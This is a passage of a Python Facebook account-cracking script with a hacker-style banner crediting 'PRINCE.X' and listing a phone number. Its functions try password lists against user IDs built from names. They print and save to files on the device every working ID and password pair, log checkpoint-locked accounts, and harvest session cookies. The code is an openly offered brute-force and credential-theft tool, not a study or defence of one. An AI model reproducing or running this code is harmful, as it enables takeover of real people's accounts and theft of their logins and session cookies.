...
================================================
\033[1;31m================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{PRINCE.X}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{ PRINCE.X}\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{PRINCE.X}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{PRINCE.X}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{0701282494}\33[0;m
...
\033[1;31m================================================
\33[37;41mLOVE JOKER PRINCE.X LOVE\33[0;m
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [PRINCE.X-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [PRINCE.X-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/PRINCE.X-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [PRINCE.X-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/PRINCE.X-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/PRINCE.X-CP.txt','a').write(ids+'|'+pas+'\n')
...
def fking1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [PRINCE.X]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [PRINCE.X==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/PRINCE.X-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/PRINCE.X-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
